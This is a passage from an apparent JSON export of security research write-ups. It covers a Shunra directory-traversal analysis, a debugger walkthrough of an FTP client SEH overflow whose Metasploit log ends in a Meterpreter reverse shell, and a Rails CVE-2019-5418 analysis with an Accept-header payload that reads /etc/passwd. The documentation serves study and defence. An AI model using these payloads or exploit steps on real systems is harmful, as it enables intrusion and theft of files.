        String s2 = storage.saveTemporaryForDownload(s, s1);\n            shunraclientresponse.SetSuccess(s2);\n        }\n        return shunraclientresponse;\n    }\n    catch(Exception exception)\n    {\n        exception.printStackTrace();\n    }\n    return null;\n}\n```\n\n\nWhere \"s\" is the file path and is user controlled. By default files are saved to \"c:\\\\windows\\\\temp\\\\files\" (win 2003 sp2).\n\nThe attacker controles \"s\" through the URL, with \"..\\\\\" sequences is posible to directory traversa.\n\nUnfortunately contents (s1) are JSON converted contents. Example valid JSON:\n\n```\n{\n    \"fileName\": \"ntxFile\",\n    \"flows\": [{\n        \"wanCloud\": {\n            \"latency\": {\n                \"latencyType\": \"Fixed\",\n                \"latency\": 75\n            },\n            \"packetLoss\": {\n                \"packetLossType\": \"None\"\n            },\n            \"bitError\": {\n                \"isActive\": false,\n                \"avgFrequency\": 0,\n                \"min\": 0,\n                \"max\": 0\n            },\n            \"congestion\": {\n                \"isActive\": false,\n                \"avgFrequency\": 0,\n                \"min\": 0,\n                \"max\": 0,\n                \"fixedLatency\": {\n                    \"latencyType\": \"Fixed\",\n                    \"latency\": 0\n                },\n                \"randomPacketLoss\": {\n                    \"packetLossType\": \"Random\",\n                    \"chance\": 0\n                }\n            },\n            \"disconnect\": {\n                \"isActive\": false,\n                \"avgFrequency\": 0,\n                \"min\": 0,\n                \"max\": 0\n            },\n            \"duplicatePackets\": {\n                \"isActive\": false,\n                \"chance\": 0,\n                \"min\": 0,\n                \"max\": 0\n            },\n            \"fragmentation\": {\n                \"isActive\": false,\n                \"chance\": 0,\n                \"maxTransmitUnit\": 0,\n                \"behavior\": \"Ignore\"\n            },\n            \"outOfOrder\": {\n                \"isActive\": false,\n                \"chance\": 0,\n                \"min\": 0,\n                \"max\": 0\n            }\n        },\n        \"clientGateway\": {\n            \"bandwidth\": {\n                \"upLink\": {\n                    \"isManual\": true,\n                    \"bandwidth\": 330\n                },\n                \"downLink\": {\n                    \"isManual\": true,\n                    \"bandwidth\": 780\n                }\n            },\n            \"isActiveBucketLimitation\": false,\n            \"bucketLimitation\": null,\n            \"isActivePacketOverhead\": false,\n            \"packetType\": null\n        },\n        \"serverGateway\": {\n            \"bandwidth\": {\n                \"upLink\": {\n                    \"isManual\": true,\n                    \"bandwidth\": 0\n                },\n                \"downLink\": {\n                    \"isManual\": true,\n                    \"bandwidth\": 0\n                }\n            },\n            \"isActiveBucketLimitation\": false,\n            \"bucketLimitation\": null,\n            \"isActivePacketOverhead\": false,\n            \"packetType\": null\n        },\n        \"endpoints\": {\n            \"serverEndpoint\": {\n                \"rangeGroups\": [{\n                    \"includeRange\": {\n                        \"fromIp\": \"1.0.0.0\",\n                        \"toIp\": \"255.255.255.255\",\n                        \"protocol\": \"ALL\",\n                        \"port\": 0\n                    },\n                    \"excludeRanges\": [{\n                        \"fromIp\": \"1.0.0.0\",\n                        \"toIp\": \"1.0.0.0\",\n                        \"protocol\": \"ALL\",\n                        \"port\": 0\n                    }]\n                }],\n                \"rangeDefinition\": \"custom\"\n            },\n            \"clientEndpoint\": {\n                \"rangeGroups\": [{\n                    \"includeRange\": {\n                        \"fromIp\": \"1.0.0.0\",\n                        \"toIp\": \"1.0.0.0\",\n                        \"protocol\": \"ALL\",\n                        \"port\": 0\n                    },\n                    \"excludeRanges\": []\n                }],\n                \"rangeDefinition\": \"custom\"\n            }\n        },\n        \"packetList\": true,\n        \"name\": \"3G\"\n    }]\n}\n```\n\n\nIt allows to create a File like;\n\n```\n<NETWOR_X ID=\"Network_Editor\" NAME=\"..\\..\\..\\metasploit2.txt\" ORIGIN=\"Network Editor Multi Flow\" CREATED_BY=\"Network Editor Multi Flow\" CREATED_ON_DATE=\"14-08-27 17:32:41\" NETWOR_X_VERSION=\"2.2\" CREATED_ON_HOST_NAME=\"juan-6ed9db6ca8\">\n  <NET_OBJECTS>\n    <WAN_CLOUD FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_WAN_CLOUD_FLOWS_1-3G\" NAME=\"Wan\" DESCRIPTION=\"3G\">\n      <FIXED_LATENCY LATENCY=\"75.0\"/>\n    </WAN_CLOUD>\n    <GATEWAY FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_CLIENT_GW_FLOWS_1-3G\" NAME=\"Clientgateway\">\n      <NICS>\n        <NIC FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_CLIENT_GW__NIC_1_FLOWS_1-3G\" NAME=\"ClientDownlink\" BANDWIDTH=\"780.0\" IN_BW_UTIL=\"0\" OUT_BW_UTIL=\"0\" PACKET_OVERHEAD_BYTES=\"\"/>\n        <NIC FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_CLIENT_GW__NIC_2_FLOWS_1-3G\" NAME=\"ClientUplink\" BANDWIDTH=\"330.0\" IN_BW_UTIL=\"0\" OUT_BW_UTIL=\"0\" PACKET_OVERHEAD_BYTES=\"\"/>\n      </NICS>\n    </GATEWAY>\n    <GATEWAY FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_SERVER_GW_FLOWS_1-3G\" NAME=\"Servergateway\">\n      <NICS>\n        <NIC FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_SERVER_GW__NIC_1_FLOWS_1-3G\" NAME=\"ServerUplink\" BANDWIDTH=\"0.0\" IN_BW_UTIL=\"0\" OUT_BW_UTIL=\"0\" PACKET_OVERHEAD_BYTES=\"\"/>\n        <NIC FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_SERVER_GW__NIC_2_FLOWS_1-3G\" NAME=\"ServerDownlink\" BANDWIDTH=\"0.0\" IN_BW_UTIL=\"0\" OUT_BW_UTIL=\"0\" PACKET_OVERHEAD_BYTES=\"\"/>\n      </NICS>\n    </GATEWAY>\n    <ENDPOINT FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_CLIENT_FLOWS_1-3G\" NAME=\"Client\">\n      <INCLUDE_IPS>\n        <IP_RANGE FROM_IP=\"1.0.0.0\" TO_IP=\"1.0.0.0\" PROTOCOL=\"0\" PORT=\"0\" IP_VERSION=\"4\"/>\n      </INCLUDE_IPS>\n    </ENDPOINT>\n    <ENDPOINT FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_SERVER_FLOWS_1-3G\" NAME=\"Server\">\n      <INCLUDE_IPS>\n        <IP_RANGE FROM_IP=\"1.0.0.0\" TO_IP=\"255.255.255.255\" PROTOCOL=\"0\" PORT=\"0\" IP_VERSION=\"4\"/>\n      </INCLUDE_IPS>\n      <EXCLUDE_IPS>\n        <IP_RANGE FROM_IP=\"1.0.0.0\" TO_IP=\"1.0.0.0\" PROTOCOL=\"0\" PORT=\"0\" IP_VERSION=\"4\"/>\n      </EXCLUDE_IPS>\n    </ENDPOINT>\n    <PACKET_LIST FLOW_ID=\"FLOWS_1-3G\" ID=\"ID_PACKET_LIST_CLIENT_FLOWS_1-3G\" NAME=\"PACKET_LIST_CLIENT_FLOWS_1-3G\"/>\n  </NET_OBJECTS>\n  <LINKS>\n    <LINK TO_OBJECT=\"ID_PACKET_LIST_CLIENT_FLOWS_1-3G\" FROM_OBJECT=\"ID_CLIENT_FLOWS_1-3G\" UNIDIRECTIONAL=\"false\"/>\n    <LINK TO_OBJECT=\"ID_CLIENT_GW__NIC_1_FLOWS_1-3G\" FROM_OBJECT=\"ID_PACKET_LIST_CLIENT_FLOWS_1-3G\" UNIDIRECTIONAL=\"false\"/>\n    <LINK TO_OBJECT=\"ID_WAN_CLOUD_FLOWS_1-3G\" FROM_OBJECT=\"ID_CLIENT_GW__NIC_2_FLOWS_1-3G\" UNIDIRECTIONAL=\"false\"/>\n    <LINK TO_OBJECT=\"ID_SERVER_GW__NIC_1_FLOWS_1-3G\" FROM_OBJECT=\"ID_WAN_CLOUD_FLOWS_1-3G\" UNIDIRECTIONAL=\"false\"/>\n    <LINK TO_OBJECT=\"ID_SERVER_FLOWS_1-3G\" FROM_OBJECT=\"ID_SERVER_GW__NIC_2_FLOWS_1-3G\" UNIDIRECTIONAL=\"false\"/>\n  </LINKS>\n</NETWOR_X>\n```\n\n\nText contents can be controlled. Feasible attack vector: upload a JSP. Problems\n\n* Shunra doesn't handle JSP directly.\n* Use the HP LoadRunner instance, unfortunately it's not necessary to run it to have Shunra running. So it's hard to write a reliable\nexploit which work son the default conditions.\n\n\nMaybe there is something I'm forgetting to get reliable code execution with not full controled (text contents) traversal...feedback is welcome.\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "21bd2a9b-7d0a-460b-9b22-e268b7c45324",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "49bb9a66-fb59-4588-bc09-abe121816aaf",
      "created": "2019-09-12T18:07:30.232159Z",
      "revisionDate": "2020-02-13T17:12:14.811328Z",
      "document": " This is plib_free__3()\n0:001> g\nDestination buffer for WS2_32!recv() is at: 0x0233f4f4\n```\n\nNow we have located the destination buffer, and we know that eventually this will overflow.\nBut we need to determine how this pointer is passed around.\n\nIf we manaully cross-reference what other functions are passing a buffer pointer to ```sub_4383C0()```,\nyou will notice there are too many stack buffer overflows. This took some time and breakpoints to figure\nout, but the correct code path for the our vulnerability should be:\n\n```\nsub_42C890() -> sub_42EE10() -> sub_42EA00() ->  sub_4383C0()\n```\n\nInside ```sub_42C890()```, we find the stack buffer:\n\n```\nAUTO:0042C8FF loc_42C8FF:                             ; CODE XREF: sub_42C890+16A\u0019j\nAUTO:0042C8FF                                         ; sub_42C890+1B5\u0019j\nAUTO:0042C8FF                 push    edi\nAUTO:0042C900                 mov     ebx, 3FFh\nAUTO:0042C905                 lea     edx, [esp+2424h+var_41C]\nAUTO:0042C90C                 push    1\nAUTO:0042C90E                 mov     eax, ds:dword_465100\nAUTO:0042C913                 mov     ecx, edi\nAUTO:0042C915                 call    sub_42EE10\n```\n\nAnd var_41C is 1024 bytes:\n\n```\n-0000041C var_41C         db 1024 dup(?)\n```\n\nOnce we know where the stack buffer comes from, we can move on to how the exploit crashes ftp.exe.\nWe can observe this crash by setting up these breakpoints first to track the buffer pointer:\n\n```\nbp 0042c915 \".printf \\\"Passing static buffer pointer at 0x%08x\\\", edx; .echo ;g\"\nbp 0042ea0c \".printf \\\"Destination buffer for receive is: 0x%08x\\n\\\", edx; .echo; g\"\nbp 0042eb73 \".printf \\\"EDX Text dump: %ma\\n\\\", edx; .echo; .echo; g\"\n```\n\nThe WinDBG output with the above breakpoints:\n\n```\nPassing static buffer pointer at 0x027ff4f4\nDestination buffer for receive is: 0x027ff4f4\nEDX Text dump: AAAAAAAAAAAAAAA ........ AAAAAAAAAAAAAAA (a very long string)\n\n(d48.864): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000041 ebx=000003fe ecx=ffffdbfc edx=000003fe esi=027ffc02 edi=02800000\neip=0042cac5 esp=027fd4ec ebp=000023ee iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nftp+0x2cac5:\n0042cac5 8807            mov     byte ptr [edi],al          ds:0023:02800000=??\n```\n\nIn this crash, ESI is the source input, which is filled with our malicious input:\n\n```\n0:001> dd esi\n027ffc02  41414141 41414141 41414141 41414141\n027ffc12  41414141 41414141 41414141 41414141\n027ffc22  41414141 41414141 41414141 41414141\n027ffc32  41414141 41414141 41414141 41414141\n027ffc42  41414141 41414141 41414141 41414141\n027ffc52  41414141 41414141 41414141 41414141\n027ffc62  41414141 41414141 41414141 41414141\n027ffc72  41414141 41414141 41414141 41414141\n```\n\nEDI would be the destination buffer used for this copy routine:\n\n```\nAUTO:0042CAC3 loc_42CAC3:                             ; CODE XREF: sub_42C890+249\u0019j\nAUTO:0042CAC3                 mov     al, [esi]       ; ESI is the malicious input\nAUTO:0042CAC5                 mov     [edi], al       ; EDI = our buffer, and AL is a byte from the malicious input\nAUTO:0042CAC7                 cmp     al, 0           ; Check null byte\nAUTO:0042CAC9                 jz      short loc_42CADB ; Done copying\nAUTO:0042CACB                 mov     al, [esi+1]     ; The next byte\nAUTO:0042CACE                 add     esi, 2\nAUTO:0042CAD1                 mov     [edi+1], al\nAUTO:0042CAD4                 add     edi, 2\nAUTO:0042CAD7                 cmp     al, 0\nAUTO:0042CAD9                 jnz     short loc_42CAC3 ; Continue copying if string isn't null\n```\n\nSince the exploit supplies a string that is long enough, the SEH chain on the stack is also\noverwritten:\n\n```\n0:001> !exchain\n027fff70: 41414141\nInvalid exception stack at 41414141\n```\n\nThe exploit simply overwrites the SEH chain to gain arbitrary code execution.\n\n\n## Verification Steps\n\nTo test the exploit:\n\n1. Install the application\n2. Start `msfconsole`\n3. Do: `use exploit/windows/ftp/labf_nfsaxe`\n4. Set options and payload\n5. Do: `exploit`\n6. Connect to the FTP server using the FTP client\n7. You should get a session like the following demonstration:\n\n```\nmsf exploit(windows/ftp/labf_nfsaxe) > run\n\n[*] Started reverse TCP handler on 172.16.85.1:4444\n[*] Please ask your target(s) to connect to 172.16.85.1:21\n[*] Server started.\nmsf exploit(windows/ftp/labf_nfsaxe) >\n[*] 172.16.85.134 - connected.\n[*] 172.16.85.134 - Response: Sending 220 Welcome\n[*] 172.16.85.134 - Request: AUTH GSSAPI\n[*] 172.16.85.134 - Response: sending 331 OK\n[*] 172.16.85.134 - Request: ADAT TlRMTVNTUA==\n[*] 172.16.85.134 - Response: Sending 230 OK\n[*] 172.16.85.134 - Request: USER Guest\n[*] 172.16.85.134 - Request: Sending the malicious response\n[*] Sending stage (179779 bytes) to 172.16.85.134\n[*] Meterpreter session 1 opened (172.16.85.1:4444 -> 172.16.85.134:49213) at 2018-01-09 22:38:33 -0600\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "ae181423-aad4-4381-aa21-4b90c4bc3a40",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "819deded-6f41-4990-97cd-f45d8441f09c",
      "created": "2019-09-12T18:07:31.452526Z",
      "revisionDate": "2020-02-13T17:12:14.576232Z",
      "document": "-\n[+] Processing arguments and criteria\n    - Pointer access level : X\n    - Pointer criteria : ['unicoderev']\n[+] Generating module info table, hang on...\n    - Processing modules\n    - Done. Let's rock 'n roll.\n[+] Querying 56 modules\n    - Querying module NMCP32.DLL\n*** ERROR: Module load completed but symbols could not be loaded for C:\\WINDOWS\\system32\\xpsp2res.dll\n    - Querying module urlmon.dll\n    - Querying module msxml3.dll\n    - Querying module CRYPT32.dll\n    - Querying module MSASN1.dll\n    - Querying module kernel32.dll\n    - Querying module msvcrt.dll\n    - Querying module GDI32.dll\n    - Querying module ntdll.dll\n    - Querying module nmcd32.dll\n    - Querying module wshtcpip.dll\n    - Querying module WS2_32.dll\n    - Querying module SENSAPI.DLL\n    - Querying module ATL.DLL\n    - Querying module CRYPTUI.dll\n    - Querying module WININET.dll\n    - Querying module CLBCATQ.DLL\n    - Querying module Secur32.dll\n    - Querying module WSOCK32.dll\n    - Querying module rsaenh.dll\n    - Querying module WS2HELP.dll\n    - Querying module ole32.dll\n    - Querying module SHLWAPI.dll\n    - Querying module hnetcfg.dll\n    - Querying module NMCH32.DLL\n    - Querying module USER32.dll\n    - Querying module comdlg32.dll\n    - Querying module IMAGEHLP.dll\n    - Querying module shdocvw.dll\n    - Querying module NMCLEN.DLL\n    - Querying module WINTRUST.dll\n    - Querying module COMRes.dll\n    - Querying module cscui.dll\n    - Querying module OLEAUT32.dll\n    - Querying module NETAPI32.dll\n    - Querying module SHELL32.dll\n    - Querying module RPCRT4.dll\n    - Querying module CSCDLL.dll\n    - Querying module mlang.dll\n    - Querying module NMCL32.exe\n    - Querying module USERENV.dll\n    - Querying module nmenv2.dll\n    - Querying module COMCTL32.dll\n    - Querying module MSCTF.dll\n    - Querying module WLDAP32.dll\n    - Querying module VERSION.dll\n    - Querying module mswsock.dll\n    - Querying module appHelp.dll\n    - Querying module browseui.dll\n    - Querying module NMCA32.DLL\n    - Querying module RichEd20.Dll\n    - Querying module UxTheme.dll\n    - Querying module ADVAPI32.dll\n    - Querying module LINKINFO.dll\n    - Querying module SETUPAPI.dll\n    - Querying module ntshrui.dll\n    - Search complete, processing results\n[+] Preparing output file 'jmp.txt'\n    - (Re)setting logfile jmp.txt\nDone. Found 0 pointers\n[+] This mona.py action took 0:02:13.578000\n```\n\n* On the other hand, I've installed the linux client, but it's a Java software, so there isn't memory corruption, just a message warning about the malformed file\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "af7876fe-e6cf-4965-8cdb-8fcf74f45eee",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "14530fed-0617-4192-812f-b80666a8bdae",
      "created": "2019-09-12T18:07:32.21733Z",
      "revisionDate": "2020-02-13T17:12:14.254267Z",
      "document": "\n\n# Background\n\nRuby on Rails is a server-side web application framework written in Ruby. It is a model-view-controller (MVC) archtecture, providing default structures for a database, a web service, and web pages. It is also a popular choice of framework among well known services and products such as Github, Bloomberg, Soudcloud, Groupon, Twitch.tv, and of course, Rapid7's Metasploit.\n\nRuby on Rails versions including 5.2.2.1 and prior are vulnerable to directory traversal in Action View. More specifically, a specially crafted accept header in combination with calls to `reander file:` can cause arbitrary files on the target server to be rendered, disclosing the file contents.\n\nIn this documentation, I'll go over:\n\n* The setup I used to test the vulnerable environment.\n* My analysis on the vulnerability. Including the basics on how Rails utilities rendering. Also, based on that knowledge, how the directory traversal happens.\n* Some information about patching.\n\n# Vulnerable Setup\n\nIn order to set up a vulnerable box for testing, do the following on a Linux (Ubuntu) machine, assuming rvm is already installed:\n\n```bash\n$ rvm gemset create test\n$ rvm gemset use test\n$ gem install rails '5.2.1'\n$ rails new demo\n```\n\nNext, `cd` to demo, and then modify the Gemfile like this:\n\n```bash\n$ echo \"gem 'rails', '5.2.1'\" >> Gemfile\n$ echo \"gem 'sqlite3', '~> 1.3.6', '< 1.4'\" >> Gemfile\n$ echo \"source 'https://rubygems.org'\" >> Gemfile\n$ bundle\n```\n\nNext, add a new controller:\n\n```bash\nrails generate controller metasploit\n```\n\nAnd add the index method for that controller (under app/controllers/metasploit_controller.rb):\n\n```ruby\nclass MetasploitController < ApplicationController\n  def index\n    render file: \"#{Rails.root}/test.html\"\n  end\nend\n```\n\nIn the root directory, add a new test.html.\n\n```bash\necho Hello World > test.html\n```\n\nAlso, add that new route in config/routes.rb:\n\n```ruby\nRails.application.routes.draw do\n  resources :metasploit\nend\n```\n\nAnd finally, start the application:\n\n```bash\nrails s -b 0.0.0.0\n```\n\n# Vulnerability Analysis\n\nAn advisory was already made available by the time the vulnerability was published. The first paragraph of that advisory pretty much explains the most important piece of the problem:\n\n> There is a possible file content disclosure vulnerability in Action View. Specially crafted accept headers in combination with calls to `render file:` can cause arbitrary files on the target server to be rendered, disclosing the file contents.\n\nSo knowing that about Action View, we want to examine the code to understand how rendering works for a file. To begin on a vulnerable machine, we can use the `gem env` command to locate the gems:\n\n```\n$ gem env\nRubyGems Environment:\n  - RUBYGEMS VERSION: 3.0.1\n  - RUBY VERSION: 2.6.0 (2018-12-25 patchlevel 0) [x86_64-linux]\n  - INSTALLATION DIRECTORY: /home/sinn3r/.rvm/gems/ruby-2.6.0\n  - USER INSTALLATION DIRECTORY: /home/sinn3r/.gem/ruby/2.6.0\n  - RUBY EXECUTABLE: /home/sinn3r/.rvm/rubies/ruby-2.6.0/bin/ruby\n  - GIT EXECUTABLE: /usr/bin/git\n  - EXECUTABLE DIRECTORY: /home/sinn3r/.rvm/gems/ruby-2.6.0/bin\n  - SPEC CACHE DIRECTORY: /home/sinn3r/.gem/specs\n  - SYSTEM CONFIGURATION DIRECTORY: /home/sinn3r/.rvm/rubies/ruby-2.6.0/etc\n  - RUBYGEMS PLATFORMS:\n    - ruby\n    - x86_64-linux\n  - GEM PATHS:\n     - /home/sinn3r/.rvm/gems/ruby-2.6.0\n     - /home/sinn3r/.rvm/rubies/ruby-2.6.0/lib/ruby/gems/2.6.0\n\n... omitted below ...\n```\n\nThe first path from `GEM PATHS` is what we want, which is where the Action View gem is saved:\n\n```\n/home/sinn3r/.rvm/gems/ruby-2.6.0/gems/actionview-5.2.1\n```\n\nSince the bug is related to rendering a file, the `find` command reveals the following files associated with rendering that we can investigate:\n\n```\n$ find . -name *render*\n./lib/action_view/renderer\n./lib/action_view/renderer/renderer.rb\n./lib/action_view/renderer/partial_renderer\n./lib/action_view/renderer/partial_renderer.rb\n./lib/action_view/renderer/template_renderer.rb\n./lib/action_view/renderer/abstract_renderer.rb\n./lib/action_view/renderer/streaming_template_renderer.rb\n./lib/action_view/rendering.rb\n./lib/action_view/helpers/rendering_helper.rb\n```\n\n## The Mechanics of Rails Rendering\n\nIt is easy to narrow down what we should be looking at, because there aren't that many files using the `:file` key, which is what the advisory describes. I decided to start with rendering_helper.rb (the `ActionView::Helpers::RenderingHelper` module), which seems to be a mixin for rendering, and hopefully I can eventually find the buggy code that way.\n\nHere's the `render` method `ActionView::Helpers::RenderingHelper`, it's great that there's API documentation:\n\n```ruby\n# Returns the result of a render that's dictated by the options hash. The primary options are:\n#\n# * <tt>:partial</tt> - See <tt>ActionView::PartialRenderer</tt>.\n# * <tt>:file</tt> - Renders an explicit template file (this used to be the old default), add :locals to pass in those.\n# * <tt>:inline</tt> - Renders an inline template similar to how it's done in the controller.\n# * <tt>:plain</tt> - Renders the text passed in out. Setting the content\n#   type as <tt>text/plain</tt>.\n# * <tt>:html</tt> - Renders the HTML safe string passed in out, otherwise\n#   performs HTML escape on the string first. Setting the content type as\n#   <tt>text/html</tt>.\n# * <tt>:body</tt> - Renders the text passed in, and inherits the content\n#   type of <tt>text/plain</tt> from <tt>ActionDispatch::Response</tt>\n#   object.\n#\n# If no options hash is passed or :update specified, the default is to render a partial and use the second parameter\n# as the locals hash.\ndef render(options = {}, locals = {}, &block)\n  case options\n  when Hash\n    if block_given?\n      view_renderer.render_partial(self, options.merge(partial: options[:layout]), &block)\n    else\n      view_renderer.render(self, options)\n    end\n  else\n    view_renderer.render_partial(self, partial: options, locals: locals, &block)\n  end\nend\n```\n\nNotice this is more like a wrapper that relies on `view_renderer`, which is an `ActionView::Renderer` object. OK, let's take a look at that.\n\n## The ActionView::Renderer class\n\nThe `ActionView::Renderer` class starts off with its own documentation, which makes it easy to understand its purpose and usage:\n\n> This is the main entry point for rendering. It basically delegates to other objects like TemplateRenderer and PartialRenderer which actually renders the template.\n>\n> The Renderer will parse the options from the render or render_body method and render a partial or a template based on the options. The TemplateRenderer and PartialRenderer objects are wrappers which do all the setup and logic necessary to render a view and a new object is created each time render is called.\n\nLooking at that, we learn one of these three classes could be used: StreamingTemplateRenderer, TemplateRenderer, and PartialRenderer. It isn't hard to figure out which one we should be looking at, because since the advisory says we are looking at a `render` function for `:file`, it is clear we should be looking at **TemplateRenderer** because only that one is checking the `:file` key.\n\n## The ActionView::TemplateRenderer Class\n\nInside the TemplateRenderer class, there is only one public method, which is the `render` method. When this is called, the method performs the following for our template:\n\n```ruby\ntemplate = determine_template(options)\nprepend_formats(template.formats)\n@lookup_context.rendered_format ||= (template.formats.first || formats.first)\nrender_template(template, options[:layout], options[:locals])\n```\n\nInside `determine_template` is when our `:file` key is actually used for the first time:\n\n```ruby\nelsif options.key?(:file)\n  with_fallbacks { find_file(options[:file], nil, false, keys, @details) }\n```\n\n`find_file` is the first thing that gets called. To find this, a quick search in the file system with `grep` identifies two files that are associated with this name:\n\n```\n$ grep -iR \"def \" * |grep find_file\nlib/action_view/lookup_context.rb:      def find_file(name, prefixes = [], partial = false, keys = [], options = {})\nlib/action_view/path_set.rb:    def find_file(path, prefixes = [], *args)\n```\n\nAfter a bit of code reading, the functionality of `find_file` is seen in the lib/action_view/path_set.rb file:\n\n```ruby\ndef find_file(path, prefixes = [], *args)\n  _find_all(path, prefixes, args, true).first || raise(MissingTemplate.new(self, path, prefixes, *args))\nend\n\n...\n\nprivate\n\ndef _find_all(path, prefixes, args, outside_app)\n  prefixes = [prefixes] if String === prefixes\n  prefixes.each do |prefix|\n    paths.each do |resolver|\n      if outside_app\n        templates = resolver.find_all_anywhere(path, prefix, *args)\n      else\n        templates = resolver.find_all(path, prefix, *args)\n      end\n      return templates unless templates.empty?\n    end\n  end\n  []\nend\n```\n\n### The PathResolver Class\n\nNotice in the above code, `outside_app` is hardcoded to true, so we want to be looking at `find_all_anywhere`. This method can be found in in the `PathResolver` class in lib/action_view/template/resolver.rb:\n\n```ruby\ndef find_all_anywhere(name, prefix, partial = false, details = {}, key = nil, locals = [])\n  cached(key, [name, prefix, partial], details, locals) do\n    find_templates(name, prefix, partial, details, true)\n  end\nend\n```\n\nGoing down to that rabbit hole, let's just keep reading what `find_templates` is doing:\n\n```ruby\ndef find_templates(name, prefix, partial, details, outside_app_allowed = false)\n  path = Path.build(name, prefix, partial)\n  query(path, details, details[:formats], outside_app_allowed)\nend\n\ndef query(path, details, formats, outside_app_allowed)\n  query = build_query(path, details)\n\n  template_paths = find_template_paths(query)\n  template_paths = reject_files_external_to_app(template_paths) unless outside_app_allowed\n\n  template_paths.map do |template|\n    handler, format, variant = extract_handler_and_format_and_variant(template)\n    contents = File.binread(template)\n\n    Template.new(contents, File.expand_path(template), handler,\n      virtual_path: path.virtual,\n      format: format,\n      variant: variant,\n      updated_at: mtime(template)\n      )\n  end\nend\n```\n\nThere are some interesting things about the `query` method. Although at first glance, you wouldn't know exactly what those functions do, but Ruby is such an easy-to-read language, you still get an idea what this method is trying to do just by reading.\n\nFor example, this line implies it is for building some kind of query that is associated with a path. This line is actually extra important, which I will explain in a separate section later:\n\n```ruby\nquery = build_query(path, details)\n```\n\nIn the next line, this seems to be loading template paths as the name implies:\n\n```ruby\ntemplate_paths = find_template_paths(query)\n```\n\nAnd then it passes those paths to this block of code:\n\n```ruby\ntemplate_paths.map do |template|\n  handler, format, variant = extract_handler_and_format_and_variant(template)\n  contents = File.binread(template)\n  ...\n```\n\nWhich clearly loads the content of the files indivisually. And then finally:\n\n```ruby\nTemplate.new(contents, File.expand_path(template), handler,\n  virtual_path: path.virtual,\n  format: format,\n  variant: variant,\n  updated_at: mtime(template)\n  )\n```\n\nThis means the content gets converted into a Template object, and that is returned all the way to the `determine_template` function we were looking at originally:\n\n```ruby\ntemplate = determine_template(options)\nprepend_formats(template.formats)\n@lookup_context.rendered_format ||= (template.formats.first || formats.first)\nrender_template(template, options[:layout], options[:locals])\n```\n\nIt looks like if the user is able to control the template name, then the `query` method will just load whatever you want, load the file, and pass it for rendering. Well, a normal Rails application probably would not want to let you load whatever you file, because that obviously would be too risky, but CVE-2019-5418 found its way.\n\n## From HTTP Header to Directory Traversal\n\nNow that we have a basic understanding of the rendering mechanics, the next question is: How does a directroy traversal occur from an HTTP **ACCEPT** header? Typically that is not how a directory traversal attack would work against a web server, but for CVE-2019-5418, it is. The proof-of-concept demonstrates:\n\n```ruby\ndef get_accept_header_value(depth, file)\n  return (('../'*depth) + file + '{{').gsub('//', '/')\nend\n\n\nres = send_request_cgi({\n  'method' => 'GET',\n  'uri' => normalize_uri(datastore['ROUTE']),\n  'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], '/etc/passwd')}\n  })\n```\n\nThe reason our HTTP ACCEPT header ends up being loaded as a template is because the way the `query` method works. As you already know, this method's main job is to load a file, and then convert that content into a Template object. Well, something funny happens in this method when it tries to call `build_query`:\n\n```ruby\ndef build_query(path, details)\n  query = @pattern.dup\n\n  prefix = path.prefix.empty? ? \"\" : \"#{escape_entry(path.prefix)}\\\\1\"\n  query.gsub!(/:prefix(\\/)?/, prefix)\n\n  partial = escape_entry(path.partial? ? \"_#{path.name}\" : path.name)\n  query.gsub!(/:action/, partial)\n\n  details.each do |ext, candidates|\n    if ext == :variants && candidates == :any\n      query.gsub!(/:#{ext}/, \"*\")\n    else\n      query.gsub!(/:#{ext}/, \"{#{candidates.compact.uniq.join(',')}}\")\n    end\n  end\n\n  File.expand_path(query, @path)\nend\n```\n\nThe `@pattern` variable holds this value as a string:\n\n```ruby\n:prefix/:action{.:locale,}{.:formats,}{+:variants,}{.:handlers,}\n```\n\nThe details argument is actually a hash that looks like the following. Notice the directory traversal string in the `:formats` key, which indicates where the HTTP ACCEPT header is stored:\n\n```ruby\n{:locale=>[:en], :formats=>[\"../../../../../../../../../../etc/passwd{{\"], :variants=>[], :handlers=>[:raw, :erb, :html, :builder, :ruby, :coffee, :jbuilder]}\n```\n\nLooking at the Ruby code, we know that it is just simply replacing specific parts of the string with the hash above. When it comes to the `formats` pattern, it is replaced with the ACCEPT header due to this line:\n\n```ruby\nquery.gsub!(/:#{ext}/, \"{#{candidates.compact.uniq.join(',')}}\")\n```\n\nAfter the modification, our string actually looks like this:\n\n```ruby\n\"home/sinn3r/demo/test.html{.{en},}{.{../../../../../../../../../../etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}\"\n```\n\nAfter the `File.expand_path` call, the query string is actually:\n\n```ruby\n\"/etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}\"\n```\n\nAfter this query is created, it is passed to the next method called `fine_template_paths`, which will actually normalize the query for us:\n\n```ruby\ndef find_template_paths(query)\n  Dir[query].uniq.reject do |filename|\n    File.directory?(filename) ||\n      # deals with case-insensitive file systems.\n    !File.fnmatch(query, filename, File::FNM_EXTGLOB)\n  end\n```\n\nUsing Pry (an interactive shell for Ruby), we can demonstrate this problem:\n\n```ruby\n[7] pry(#<ActionView::FallbackFileSystemResolver>)> path = File.expand_path(\"home/sinn3r/demo/test.html{.{en},}{.{../../../../../../../../../../etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}\", @path)\n=> 